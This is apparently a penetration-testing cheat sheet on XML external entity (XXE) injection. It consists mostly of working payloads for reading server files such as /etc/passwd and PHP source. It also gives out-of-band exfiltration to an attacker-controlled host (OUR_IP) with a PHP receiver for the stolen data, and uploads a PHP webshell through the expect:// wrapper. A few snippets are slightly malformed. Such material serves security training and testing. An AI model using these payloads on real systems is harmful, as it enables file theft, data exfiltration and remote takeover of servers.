# XML External Entities (XXE)

## **Introduction**

> XML external entity injection (XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. XXE can allow an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.\
> In some situations, an attacker can leverage an XXE vulnerability to perform SSRF attacks\
> **Source:** [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

***

## **XXE Basic Payloads**

| Code                                                                               | Description                                                                                                                                                |
| ---------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`                                | Define External Entity to a URL                                                                                                                            |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                        | Define External Entity to a local file path (XXE Local File Disclosure)                                                                                    |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter (XXE PHP Source Code Disclosure). You will need to use `echo 'base64out' \| base64 -d` to decode the output |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`        | Reading a file through a PHP error (XXE PHP Source Code Disclosure)                                                                                        |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">`  | Reading a file OOB (out-of-band) exfiltration                                                                                                              |

***

## **XXE Tools and Useful Resources**

1. [https://github.com/enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector)
2. [https://github.com/luisfontes19/xxexploiter](https://github.com/luisfontes19/xxexploiter)
3. [https://github.com/payloadbox/xxe-injection-payload-list](https://github.com/payloadbox/xxe-injection-payload-list)

***

## **XXE Enumeration & Discovery**

> * Suppose a web application utilizes outdated XML libraries to parse and process XML input data from the front-end user.
> * In that case, it may be possible to send malicious XML data to disclose local files stored on the back-end server.
> * A XXE attack defines a custom entity within the XML DTD to steal data such as configuration files, sensitive information and so on.
> * These files may be configuration files that may contain sensitive information like passwords or even the source code of the web application
> * XXE attacks can even be leveraged to steal the hosting server's credentials, which would compromise the entire server and allow for remote code execution.

***

## **XXE Detection**

1. Identify an XML file upload form which sends a request containing the xml's file content in cleartext
2. Identify a XML reflected tag/parameter inside the web application
3. If any of the previous steps finds a potential XXE vector, inject the following payload after the XML DTD (e.g. after `<xml version="1.0" encoding="UTF-8?>`):
   * `<!DOCTYPE foo [ <!ENTITY &xxe "my entity value" > ]>`
   * This definition means that any usage of the entity reference `&xxe;` within the XML document will be replaced with the defined value: "my entity value".
4. Add a reference to the previous entity inside the XXE vector (example: email tag) as follows:
   * `<email> &xxe; </email>`
   * If "my entity value" is reflected (in the response or in the resulting webpage), then you can proceed with other XXE payloads

***

## **XXE Non-PHP Source Code Disclosure using CDATA**

1. Use (inject) the following XXE Payload:

```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```

2. Host a DTD file on our Kali machine: `echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd`
3. Start an HTTP server: `python3 -m http.server`
4. Reference the xxe entity to print the file content (e.g. use `&xxe;` in any reflected tag)

***

## **XXE Remote Code Execution via PHP Expect Wrapper**

1. Write the webshell in a file: `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php`
2. Start a webserver: `python3 -m http.server 80`
3.  Use the following XXE Payload:

    ```
    <?xml version="1.0"?>
    <!DOCTYPE email [
      <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
    ]>
    ```
4. Use a reference to the previously defined entity inside a reflected XML tag: `<email>&xxe;</email>`

***

## **XXE Fully Blind data Exfiltration (Out of Band (XXE))**

1.  Write the following `xxe.dtd` file on our Kali machine:

    ```
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
    ```
2.  Write the following `index.php` file on our Kali machine:

    ```
    <?phpif(isset($_GET['content'])){
     error_log("\n\n" . base64_decode($_GET['content']));
    }
    ?>
    ```
3. Start a php webserver (in the same folder as index.php): `php -S 0.0.0.0:8000`
4.  Use the following XXE Payload:

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
      %remote;
      %oob;
    ]>
    ```
5. Reference the XXE entity in a reflected XML parameter: `<root>&content;</root>`
